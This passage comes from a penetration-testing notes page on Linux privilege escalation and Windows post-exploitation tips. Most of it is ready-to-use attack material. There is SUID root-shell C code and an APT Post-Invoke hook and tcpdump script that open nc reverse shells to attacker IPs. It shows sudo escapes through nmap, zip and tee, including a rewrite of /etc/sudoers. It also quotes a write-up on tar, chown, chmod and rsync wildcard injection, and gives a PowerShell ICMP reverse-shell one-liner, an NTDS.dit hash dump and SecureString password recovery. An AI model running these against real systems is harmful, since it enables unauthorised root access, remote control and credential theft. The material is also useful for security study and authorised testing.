* It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0

Elevating privilege from a suid binary
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If we have ability to create a suid binary, we can use either 

Suid.c

::

  int main(void) {
  setgid(0); setuid(0);
  execl(“/bin/sh”,”sh”,0); }

or

::

 int main(void) {
 setgid(0); setuid(0);
 system("/bin/bash -p"); }

However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it's a symlink to bash, it won't provide us suid privileges, bash automatically drops its privileges when it's being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.

More details can be found at `Common Pitfalls When Writing Exploits <http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html>`_


MySQL Privileged Escalation
---------------------------

If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  

More Information
^^^^^^^^^^^^^^^^

* The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.

* When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.

* Commands can be executed inside MySQL, however, commands are executed as the current logged in user.

::

  mysql> \! sh

Cron.d
------

Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.


Unattended APT - Upgrade
------------------------

If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands

DPKG
^^^^

Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.

::

 Dpkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};
 
There are also options

::

 Dpkg::Pre-Invoke {"command";};
 Dpkg::Post-Invoke {"command";};

They execute commands before/after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);

APT
^^^

* APT::Update::Pre-Invoke {"your-command-here"};

* APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);

* APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).

To invoke the above, create a file in  /etc/apt/apt.conf.d/ folder specifying the NN<Name> and keep the code in that

For example:

::

 APT::Update::Post-Invoke{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f";};

When the apt-update would be executed, it would be executed as root and we would get a shell as a root.

SUDO -l Permissions
-------------------

Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find and zip.

nmap suid
^^^^^^^^^

:: 

  nmap --script <(echo 'require "os".execute "/bin/sh"')

or

:: 

  nmap --interactive

tee suid
^^^^^^^^

If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let's say tidy.sh is executed as root on the server, we can write the below code in temp.sh

:: 

  temp.sh
  echo "example_user ALL=(ALL) ALL" > /etc/sudoers 

or 

::

  chmod +w /etc/sudoers to add write properties to sudoers file to do the above

and then

:: 

  cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

which will add contents of temp.sh to tidyup.sh. ( Assuming tidyup.sh is running as root by crontab )

tcpdump
^^^^^^^

The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )

:: 

  id
  /bin/nc 192.168.110.1 4444 -e /bin/bash

Execute the command

:: 

  sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root

where
 
:: 

  -C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

  -W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

  -z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

  Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

  And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

   -Z user 
   --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

   This behavior can also be enabled by default at compile time.

zip
^^^

::

  touch /tmp/exploit
  sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"

find
^^^^

If find is suid, we can use

::

 touch foo
 find foo -exec whoami \;

Here, the foo file ( a blank file ) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.

HollyGrace has mentioned this in `Linux PrivEsc: Abusing SUID <https://www.gracefulsecurity.com/linux-privesc-abusing-suid/>`_




More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.


Unix Wildcards
--------------

The below text is directly from the `DefenseCode Unix WildCards Gone Wild <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>`_.

Chown file reference trick (file owner hijacking)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.

:: 

  [root@defensecode public]# ls -al
  total 52
  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
  drwx------. 22 user user 4096 Oct 28 17:34 ..
  -rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
  -rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
  -rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
  -rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
  -rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
  -rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
  -rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
  -rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
  -rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
  -rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
  -rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
  -rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php

Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.

:: 

   [root@defensecode public]# chown -R nobody:nobody \*.php

Let's see who owns files now...

:: 

  root@defensecode public]# ls -al
  total 52
  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
  drwx------. 22 user user 4096 Oct 28 17:34 ..
  -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
  -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
  -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
  -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
  -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
  -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
  -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
  -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
  -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
  -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
  -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
  -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php

Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.

:: 

  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.

Let's check chown manual page (man chown):

:: 

   --reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values

So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument	to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.

Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.


Chmod file reference trick
^^^^^^^^^^^^^^^^^^^^^^^^^^

Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):

:: 

  --reference=RFILE    :   use RFILE's mode instead of MODE values

Example is presented below.

:: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php

Superuser will now try to set mode 000 on all files.

:: 

  [root@defensecode public]# chmod 000 *

Let's check permissions on files...

:: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
    -rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
    -rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
    -rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
    -rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
    -rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
    -rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
    -rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php

What happened? Instead of 000, all files are now set to mode 777 because of the '--reference' option supplied through file name..Once again,file .drf.php owned by user 'leon' with mode 777 was used as reference file and since --reference option is supplied, all files will be set to mode 777. Beside just --reference option, attacker can also create another file with '-R' filename, to change file permissions on files in	all subdirectories recursively.
   

Tar arbitrary command execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
Previous example is nice example of file ownership hijacking. Now, let's go to even more interesting stuff like arbitrary command execution. 		Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:

:: 

    [root@defensecode public]# tar cvvf archive.tar *

So, what's the problem with 'tar'? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let's check tar manual page (man tar):

:: 

    --checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
    --checkpoint-action=ACTION : execute ACTION on each checkpoint

There is '--checkpoint-action' option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

Check the following directory:

:: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

Now, for example, root user wants to create archive of all files in current directory.

:: 

    [root@defensecode public]# tar cf archive.tar *
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command execution under root privileges. Once again, there are few files created by user 'leon'.

:: 

    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

  Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.

:: 

    [root@defensecode public]# cat shell.sh
    /usr/bin/id

So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the 'root' account above.
   

Rsync arbitrary command execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very common on Unix systems. If we check 'rsync' manual page, we can again find options that can be abused for arbitrary command execution.

Rsync manual: "You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote."

Interesting rsync option from manual:

:: 

  -e, --rsh=COMMAND       specify the remote shell to use
  --rsync-path=PROGRAM    specify the rsync to run on remote machine			

Let's abuse one example directly from the 'rsync' manual page. Following example will copy all C files in local directory to a remote host 'foo' in '/src' directory.

:: 

  # rsync -t *.c foo:src/


Directory content:

:: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

Now root will try to copy all C files to the remote server.

:: 

    [root@defensecode public]# rsync -t *.c foo:src/

    rsync: connection unexpectedly closed (0 bytes received so far) [sender]
    rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]

Let's see what happened...

:: 

    [root@defensecode public]# ls -al
    total 76
    drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

There were two files owned by user 'leon', as listed below.

:: 

    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

After 'rsync' execution, new file shell\_output.txt whose owner is root is created in same directory.

:: 

    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

If we check its content, following data is found.

:: 

    [root@defensecode public]# cat shell_output.txt
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option on command line, and shell.c will be executed upon'rsync' start. Content of shell.c is presented below.

:: 

    [root@defensecode public]# cat shell.c
    /usr/bin/id > shell_output.txt


.. _tips-and-tricks:

Tips and Tricks
===============

Windows
-------

Get-ChildItem Mode Values
^^^^^^^^^^^^^^^^^^^^^^^^^

'Mode' values returned by PowerShell's Get-ChildItem cmdlet?

::

 PS> gci|select mode,attributes -u

 Mode                Attributes
 ----                ----------
 d-----               Directory
 d-r---     ReadOnly, Directory
 d----l Directory, ReparsePoint
 -a----                 Archive

In any case, the full list is:

::

 d - Directory
 a - Archive
 r - Read-only
 h - Hidden
 s - System
 l - Reparse point, symlink, etc.

Zip or unzip using ONLY Windows' built-in capabilities? 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Powershell way

::

 Add-Type -A System.IO.Compression.FileSystem
 [IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
 [IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')

Alternate Data Stream
^^^^^^^^^^^^^^^^^^^^^
Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.

The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).

Powershell-Way

::

 PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *

 Filename: C:\Users\Administrator\example.zip

 Stream             Length
 ------             -------
 :$DATA             8
 pass.txt           4

Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.

::

 Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
 The password is Passw0rd!

Check a directory for ADS?

::

 gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

DIR Way

Current directory ADS Streams

::

 dir /r | find ":$DATA"

Sub-directories too

::

 dir   /s /r | find ":$DATA"

Reading the hidden stream

::

 more < testfile.txt:hidden_stream::$DATA

Redirecting Standard Out and Standard Error from PowerShell Start-Process
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.

::

 PS C:\> Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt

`Powershell Start-Process Module Documentation <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process>`_.


NTDS.dit and SYSTEM hive
^^^^^^^^^^^^^^^^^^^^^^^^^

If you have found files such as 

::

 IP_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
 IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above

Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,

::

 python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

ICMP Shell
^^^^^^^^^^

Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use `Simple reverse ICMP Shell <https://github.com/inquisb/icmpsh>`_ However, this requires the executable to be present on the system. There's a powershell version of `ICMP Reverse Shell <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>`_ Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.

::

 powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"


The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is

* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer `PowerShell –EncodedCommand and Round-Trips <https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/>`_
* Utilize the `Add-Content cmdlet <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1>`_ to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.
 
 ::
  
  Add-Content <filename> "Base64 encoded content"

* Once the base64-encoded data is transferred, we can utilize `certutil <https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx>`_ from Microsoft to decode the base64-encoded to normal file.

 ::

  certutil <-decode/ -encode> <input file> <output file>
  -decode Decode a Base64-encoded file
  -encode Encode a file to Base64

* Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.

* Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let's say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.

 ::

  $username = 'UsernameHere';
  $password = 'PasswordHere';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 

* Once, we have created a PSCredential, we can use `Invoke-Command <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command>`_  to execute command as that user.

  ::
   
   Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
   -ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.

* Possibly, we can execute the ICMP Shell code to get the shell as the new user.

* One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user. 
  
  * Check powershell processes with Show-Process

   ::

    Show-Process -Name *power* "
  
  *  Note down  the PID 
  * Execute shell as the different user 
  * Stop-Process the previous PID

Recovering password from System.Security.SecureString
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If we have windows credentials stored as System.Security.SecureString, we can use

::

 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
 $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

or 

::

 $UnsecurePassword = (New-Object PSCredential "user",$SecurePassword).GetNetworkCredential().Password

Example:

::

 PS> $PlainPassword = Read-Host -AsSecureString  "Enter password"
 PS> Enter password: ***
 PS> $PlainPassword
 PS> System.Security.SecureString
 PS> $UnsecurePassword1 = (New-Object PSCredential "user",$PlainPassword).GetNetworkCredential().Password
 PS> $UnsecurePassword1
 PS> yum

Copy To or From a PowerShell Session
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from `Copy To or From a PowerShell Session <https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/>`_

* Copy Local files to a remote session :
 
 ::

  ##Initialize the session
  $TargetSession = New-PSSession -ComputerName HALOMEM03

  ##  Copy Files from Local session to remote session
  Copy-Item -ToSession $TargetSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator.HALO\desktop\" -Recurse

* Copy some files from a remote session to the local server:

  ::

   ## Create the session
   $SourceSession = New-PSSession -ComputerName HALODC01

   ## Copy from Remote machine to Local machine
   Copy-Item -FromSession $SourceSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator\desktop\" -Recurse

Get-Hash
^^^^^^^^

`Get-FileHash <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash>`_ Computes the hash value for a file by using a specified hash algorithm.

::

 PS > Get-FileHash Hello.rst                                                                                                                                                        

 Algorithm       Hash                                                                   Path                                                                                                                                                                            
 ---------       ----                                                                   ----                                                                                                                                                                            
 SHA256          8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC       /tmp/Hello.rst                                                                                   

Active Directory Enumeration and Remote Code Execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Probably, refer  :doc:`LFF-IPS-P3-Exploitation`

It contains

* Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.
* Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.

Others
^^^^^^

* Invoking Net Use using Credentials to mount remote system

 The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file
 ::

   Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}


Wget
----

FTP via Wget
^^^^^^^^^^^^

